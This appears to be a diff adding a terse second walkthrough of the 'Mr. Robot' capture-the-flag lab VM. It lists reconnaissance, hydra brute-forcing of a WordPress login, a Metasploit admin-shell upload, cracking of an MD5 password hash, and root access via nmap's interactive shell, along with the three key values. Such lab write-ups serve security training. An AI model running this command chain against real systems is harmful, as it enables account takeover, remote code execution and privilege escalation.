@@ -117,7 +117,62 @@ Now we can login as robot, as we have password for them.
 
 
 
+-----Second Version : 
 
+$ nmap -sS -T4 192.168.2.4
+
+/robots.txt
+User-agent: *
+fsocity.dic
+key-1-of-3.txt
+
+$ file fsocity.dic
+
+$ wc -l fsocity.dic
+$ head fsocity.dic
+$ sort fsocity.dic | uniq | wc -l
+
+$ nikto -h 192.168.2.4
+$ hydra -vV -L fsocity.dic.uniq -p wedontcare 192.168.2.4 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'
+
+$ hydra -vV -l elliot -P fsocity.dic.uniq vm http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=is incorrect'
+
+$ msfconsole
+msf > use exploit/unix/webapp/wp_admin_shell_upload
+> set USERNAME elliot
+> set PASSWORD ER28-0652
+> set RHOST 192.168.2.4
+> set RHOST 192.168.2.4
+meterpreter >
+> shell
+python -c 'import pty; pty.spawn("/bin/sh")'
+
+$ id
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+$
+
+$ ls /home/robot
+$ cat password.raw-md5
+robot:c3fcd3d76192e4007dfb496cca67e13b
+$ ./hashcat64.bin -a 0 -m 0 password.md5 /usr/share/wordlists/rockyou.txt -o cracked.txt
+c3fcd3d76192e4007dfb496cca67e13b:abcdefghijklmnopqrstuvwxyz
+$ su robot
+Password: abcdefghijklmnopqrstuvwxyz
+
+robot@linux:~$ cat /home/robot/key-2-of-3.txt
+822c73956184f694993bede3eb39f959
+
+$ find / -perm -4000 -type f 2>/dev/null
+
+robot@linux:~$ nmap --interactive
+
+nmap> !whoami
+nmap> !sh
+# cd /root
+# ls
+firstboot_done key-3-of-3.txt
+# cat key-3-of-3.txt
+04787ddef27c3dee1ee161b21670b4e4
 
 
 
